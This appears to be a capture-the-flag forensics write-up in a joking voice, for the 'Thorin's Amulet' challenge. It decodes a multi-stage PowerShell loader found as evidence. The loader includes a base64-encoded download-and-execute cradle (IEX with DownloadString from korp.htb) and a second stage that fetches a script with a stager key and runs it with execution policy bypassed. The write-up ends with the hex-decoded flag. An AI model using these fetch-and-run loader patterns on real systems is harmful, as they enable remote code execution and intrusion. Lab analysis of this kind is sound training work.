# Cyber Apocalypse CTF 2025: Tales from Eldoria

## Thorinâ€™s Amulet
> Garrick and Thorinâ€™s visit to Stonehelm took an unexpected turn when Thorinâ€™s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service

WHY ARE THIS FORENSICS THIS LONG ðŸ˜­ðŸ˜­ðŸ˜­

```ps1
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="

Base 64 my beloved ðŸ˜˜

```
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

Ok impress me

```bash
curl -s http://94.237.63.32:37077/update
```

NOO NOT ANOTHER PS1 COME ON ðŸ˜°

```bash
wget http://94.237.63.32:37077/update -O update.ps1
```

```ps1
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

Oh guess what...yeah ANOTHER PS1 ðŸ¤¯

```bash
curl -s 94.237.63.32:37077 -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" -o a541a.ps1
```

```ps1
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```

Disgusting ðŸ¤¢ let me convert it to python real quick

```python
hex_string = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
decoded_string = bytes.fromhex(hex_string).decode()
print(decoded_string)
```

Never again ðŸ˜¤
